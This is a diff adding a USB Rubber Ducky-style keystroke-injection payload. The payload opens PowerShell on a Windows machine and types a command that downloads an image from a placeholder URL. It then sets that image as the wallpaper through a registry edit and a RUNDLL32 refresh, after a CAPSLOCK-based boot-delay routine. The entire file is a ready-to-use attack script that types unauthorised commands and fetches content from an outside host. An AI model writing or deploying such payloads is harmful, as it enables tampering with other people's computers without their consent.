@@ -1,0 +1,51 @@
+REM Wallpaper Changer
+REM H4ck1ngM4rk
+REM Downloads a picture and set it as wallpaper, gets Visible after Restart or Relogin
+REM Tested on Windows 11 PRO
+
+EXTENSION DETECT_READY
+    REM VERSION 1.1
+    REM AUTHOR: Korben
+
+    REM_BLOCK DOCUMENTATION
+        USAGE:
+            Extension runs inline (here)
+            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
+            boot delay
+
+        TARGETS:
+            Any system that reflects CAPSLOCK will detect minimum required delay
+            Any system that does not reflect CAPSLOCK will hit the max delay of 3000ms
+    END_REM
+
+    REM CONFIGURATION:
+    DEFINE #RESPONSE_DELAY 25
+    DEFINE #ITERATION_LIMIT 120
+
+    VAR $C = 0
+    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
+        CAPSLOCK
+        DELAY #RESPONSE_DELAY
+        $C = ($C + 1)
+    END_WHILE
+    CAPSLOCK
+END_EXTENSION
+
+
+DEFINE URL example.com
+REM The URL to get the Picture from
+DEFINE PATH $home\XXX.jpg
+REM Define where to store the Picture
+GUI x
+DELAY 100
+STRING i
+DELAY 750
+STRING Invoke-WebRequest https://
+STRING URL
+SPACE
+STRING -OutFile
+SPACE
+STRING PATH
+STRING ; reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "
+STRING PATH
+STRINGLN " /f; RUNDLL32.EXE USER32.DLL ,UpdatePerUserSystemParameters ,1 ,True;exit;
